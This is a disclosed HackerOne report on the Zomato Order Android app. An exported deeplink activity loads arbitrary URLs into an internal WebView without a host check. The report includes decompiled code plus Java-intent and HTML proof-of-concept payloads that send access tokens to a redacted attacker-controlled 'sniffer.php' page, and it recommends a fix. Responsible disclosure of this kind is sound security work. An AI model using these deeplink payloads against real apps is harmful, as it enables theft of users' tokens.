# [Zomato Order] Insecure deeplink leads to sensitive information disclosure

## Report Details
- **Report ID**: 532225
- **URL**: https://hackerone.com/reports/532225
- **State**: Closed
- **Severity**: high
- **Submitted**: 2019-04-09T01:46:13.333Z
- **Disclosed**: 2021-09-23T05:54:00.030Z

## Reporter
- **Username**: shell_c0de
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: zomato

## Vulnerability Information
Hello, i want to report the vulnerability found,
Since the following activity `com.application.zomato.activities.DeepLinkRouter` has `exported="true"` it can be exploited by another application.

###Application Information

Application: [Zomato Order - Food Delivery App](https://play.google.com/store/apps/details?id=com.application.zomato.ordering)
Package Name: `com.application.zomato.ordering`
Version: `5.6.4`
Version Status: Last
Vulnerable class: `com.application.zomato.activities.DeepLinkRouter`

###Vulnerability

Using a special intent, you can send the access tokens to a malicious site.
```java
Follow the code
public class com.application.zomato.activities.DeepLinkRouter extends BaseAppCompactActivity {
public void onCreate(Bundle arg4) {
        super.onCreate(arg4);
        this.setContentView(0x7F0B04D2);
 if((TextUtils.isEmpty(this.c)) && this.getIntent() != null && this.getIntent().getAction() != null && ("android.intent.action.VIEW".equals(this.getIntent().getAction()))) {
            this.c = this.getIntent().getData().toString();
        }
        this.e(this.c);// getting zomatodelivery://etc URL
//..
private void e(String arg11) {
v0 = Uri.parse(arg11);
            if(!"zomato".equals(v0.getScheme()) && !"zomatodelivery".equals(v0.getScheme())) {
                return;
            }
            v1 = v0.getHost();
 if("zloyaltywebview".equals(v1)) {
                            if(TextUtils.isEmpty(v0.getQueryParameter("url"))) {
                                goto label_1496;
                            }
                            if(v0.getQueryParameter("navigation_bar_type") != null) {
                                if(!v0.getQueryParameter("navigation_bar_type").equalsIgnoreCase("transparent")) {
                                }
                                else {
                                    this.a(v0);//without check host
                                    goto label_1496;
                                }
                            }

                            this.g(v0);//with check host
                            goto label_1496;
//..
   private void a(Uri arg4) {
        String v0 = arg4.getQueryParameter("header_title");
        String v4 = arg4.getQueryParameter("url") != null ? arg4.getQueryParameter("url") : "";
        this.a(new Intent[]{WebViewActivity.newIntent(((Context)this), v4, v0, false)});//loadUrl
    }
```
Host check missing.
###PoC:
Java PoC:
```java
  Intent intent = new Intent("android.intent.action.VIEW");
  intent.setData(Uri.parse("zomatodelivery://zloyaltywebview/?url=██████████sniffer.php&navigation_bar_type=transparent"));
  startActivity(intent);
```
Payload: ████████
███████

HTML PoC:
```html
<a href="zomatodelivery://zloyaltywebview/?url=████sniffer.php&navigation_bar_type=transparent">Send token Zomato</a>
```
████
Payload: █████████zomato.html

###Fix
Check the host before load to WebView, your regular check in CommonLib works fine.

## Impact

1) Leakage of access tokens to arbitrary sites
2) XSS/Ability of open arbitrary sites in your internal WebView

## Attachments
No attachments
